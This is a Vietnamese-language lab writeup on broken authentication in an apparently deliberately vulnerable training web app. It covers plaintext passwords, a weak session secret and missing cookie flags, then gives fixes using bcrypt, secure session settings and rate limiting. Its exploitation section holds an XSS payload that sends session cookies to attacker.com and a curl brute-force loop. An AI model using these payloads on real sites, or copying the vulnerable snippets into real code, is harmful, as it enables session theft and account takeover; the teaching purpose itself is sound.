# Broken Authentication — Writeup

> **Mức độ:** Critical  
> **Vị trí:** Login system, Session management  
> **CWE:** CWE-287 · CWE-256 · CWE-521

---

## 1. Broken Authentication là gì?

Broken Authentication bao gồm các lỗi trong cơ chế xác thực và quản lý session:
- Password lưu plaintext
- Session secret yếu
- Cookie không có HttpOnly/Secure flag
- Không có rate limiting (brute force)
- Session không expire đúng cách

---

## 2. Các lỗi trong VulnWebApp

### Lỗi 1: Password Plaintext

```javascript
// database/init.sql
INSERT INTO users (username, password) VALUES ('admin', 'admin123');
// Password lưu dạng plain text trong SQLite
```

**Impact:** Nếu database bị leak → tất cả password lộ ngay.

---

### Lỗi 2: Weak Session Secret

```javascript
// server.js
app.use(session({
  secret: '123456',   // Cực kỳ yếu — có thể brute force
  // ...
}));
```

**Impact:** Kẻ tấn công forge session token hợp lệ.

---

### Lỗi 3: Cookie Flags Missing

```javascript
cookie: {
  httpOnly: false,  // JS có thể đọc: document.cookie
  // secure: false  // Gửi qua HTTP (không mã hóa)
  // sameSite: không set → CSRF possible
}
```

---

### Lỗi 4: Session lưu toàn bộ user object (kể cả password)

```javascript
req.session.user = user;  // user object có cả password field
```

Xem tại `/debug/session` — password hiện ra trong session dump.

---

### Lỗi 5: Không cần password cũ để đổi password

```javascript
app.post('/change-password', (req, res) => {
  const { new_password } = req.body;
  // Không yêu cầu current_password
  db.prepare('UPDATE users SET password = ? WHERE id = ?').run(new_password, userId);
});
```

---

## 3. Cách khai thác

### 3.1 SQL Injection → plaintext password leak

Sau khi dump database qua SQLi, passwords lộ ngay (không cần crack hash):
```
admin  | admin123
user   | 123456
alice  | alice2024
```

### 3.2 Cookie theft via XSS → Session hijack

```javascript
// Payload trong comment box:
document.location = 'http://attacker.com?c=' + document.cookie;
// Do httpOnly: false → JS đọc được session cookie
```

### 3.3 Brute Force Login

```bash
# Không có rate limiting → brute force thoải mái
for pass in password 123456 admin123 qwerty; do
  curl -s -X POST http://localhost:3000/login \
    -d "username=admin&password=$pass" | grep -i "dashboard\|Invalid"
done
```

---

## 4. Cách Fix

### Fix 1: Hash Password với bcrypt

```javascript
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// Đăng ký:
const hash = await bcrypt.hash(plainPassword, SALT_ROUNDS);
db.prepare('INSERT INTO users (username, password) VALUES (?,?)').run(username, hash);

// Login:
const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
const valid = user && await bcrypt.compare(plainPassword, user.password);
if (!valid) return res.render('login', { error: 'Invalid credentials' });
```

### Fix 2: Strong session config

```javascript
app.use(session({
  secret: require('crypto').randomBytes(64).toString('hex'), // Random 64-byte secret
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,     // Ngăn JS đọc cookie
    secure: true,       // Chỉ HTTPS
    sameSite: 'strict', // Ngăn CSRF
    maxAge: 1000 * 60 * 30  // 30 phút expire
  }
}));
```

### Fix 3: Không lưu sensitive data trong session

```javascript
// Chỉ lưu id và role
req.session.user = {
  id: user.id,
  username: user.username,
  role: user.role
  // Không lưu password
};
```

### Fix 4: Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 phút
  max: 5,                      // Tối đa 5 lần thử
  message: 'Too many login attempts. Try again in 15 minutes.'
});

app.post('/login', loginLimiter, (req, res) => { ... });
```

---

## 5. Tham khảo

- [OWASP — Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP — Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [CWE-256](https://cwe.mitre.org/data/definitions/256.html) — Plaintext Storage of Password
